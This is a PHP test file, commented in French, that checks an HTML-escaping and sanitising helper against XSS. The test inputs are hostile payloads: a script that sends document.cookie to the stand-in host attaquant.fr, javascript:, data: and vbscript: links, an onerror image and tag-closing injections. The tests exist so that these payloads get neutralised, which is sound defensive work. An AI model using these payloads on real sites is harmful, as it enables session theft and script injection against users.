<?php
declare(strict_types=1);

use ZenCamp\Security\Html;

/**
 * Protection XSS : echappement contextuel en sortie.
 * Exigence : aucune donnee utilisateur ne doit pouvoir devenir du code.
 */

Test::cas('SEC-24', 'Un script injecte dans un avis client est neutralise', function () {
    $avis = '<script>fetch("https://attaquant.fr/?c="+document.cookie)</script>';
    $sortie = Html::e($avis);

    Test::neContientPas('<script>', $sortie, 'la balise ne doit plus exister');
    Test::contient('&lt;script&gt;', $sortie, 'chevrons echappes');
});

Test::cas('SEC-25', 'Les apostrophes et guillemets sont echappes (sortie d attribut)', function () {
    $sortie = Html::e('" onmouseover="alert(1)');

    Test::neContientPas('"', $sortie, 'aucun guillemet brut ne doit sortir');
    Test::contient('&quot;', $sortie);
    Test::contient('&apos;', Html::e("L'Hotel"));
});

Test::cas('SEC-26', 'Les accents restent lisibles apres echappement', function () {
    Test::estIdentique('Séjour bien-être', Html::e('Séjour bien-être'));
});

Test::cas('SEC-27', 'Une valeur nulle ne provoque pas d erreur', function () {
    Test::estIdentique('', Html::e(null));
});

Test::cas('SEC-28', 'Les schemas d URL dangereux sont bloques', function () {
    Test::estIdentique('#', Html::lien('javascript:alert(1)'), 'javascript:');
    Test::estIdentique('#', Html::lien('data:text/html,<script>alert(1)</script>'), 'data:');
    Test::estIdentique('#', Html::lien('vbscript:msgbox(1)'), 'vbscript:');
    Test::estIdentique('#', Html::lien('//attaquant.fr/phishing'), 'lien protocol-relative');
});

Test::cas('SEC-29', 'Le schema masque par des caracteres de controle est bloque', function () {
    Test::estIdentique('#', Html::lien("java\tscript:alert(1)"));
    Test::estIdentique('#', Html::lien(" javascript:alert(1)"));
});

Test::cas('SEC-30', 'Les liens legitimes restent utilisables', function () {
    Test::estIdentique('https://zencamp.fr/sejours', Html::lien('https://zencamp.fr/sejours'));
    Test::estIdentique('mailto:contact@zencamp.fr', Html::lien('mailto:contact@zencamp.fr'));
    Test::estIdentique('/reservation', Html::lien('/reservation'));
});

Test::cas('SEC-31', 'Une valeur inseree dans une URL est encodee', function () {
    Test::estIdentique('yoga%20%26%20detox', Html::url('yoga & detox'));
    Test::neContientPas('&', Html::url('a&b'), 'aucun separateur de parametre injectable');
});

Test::cas('SEC-32', 'Une valeur inseree dans un bloc script ne peut pas refermer la balise', function () {
    $sortie = Html::js('</script><script>alert(1)</script>');

    Test::neContientPas('</script>', $sortie, 'la balise ne doit pas pouvoir etre refermee');
    Test::contient('u003C', $sortie, 'chevrons encodes en unicode');
});

Test::cas('SEC-33', 'Le contenu riche ne conserve que les balises de la liste blanche', function () {
    $entree = '<p>Une <strong>retraite</strong> de yoga</p>'
        . '<img src=x onerror="alert(1)">'
        . '<a href="javascript:alert(1)">clic</a>';
    $sortie = Html::richeSimple($entree);

    Test::contient('<strong>retraite</strong>', $sortie, 'mise en forme conservee');
    Test::neContientPas('onerror', $sortie, 'gestionnaire d evenement retire');
    Test::neContientPas('<img', $sortie, 'balise hors liste blanche retiree');
    Test::neContientPas('javascript:', $sortie, 'lien dangereux retire');
});

Test::cas('SEC-34', 'Les attributs des balises autorisees sont supprimes', function () {
    $sortie = Html::richeSimple('<p onclick="voler()" style="display:none">texte</p>');

    Test::estIdentique('<p>texte</p>', $sortie);
});

Test::cas('SEC-35', 'Le nonce CSP est aleatoire et de longueur suffisante', function () {
    $a = Html::nonce();
    $b = Html::nonce();

    Test::estVrai($a !== $b, 'un nonce ne doit jamais etre rejoue');
    Test::estVrai(strlen(base64_decode($a, true) ?: '') === 16, '128 bits d entropie attendus');
});
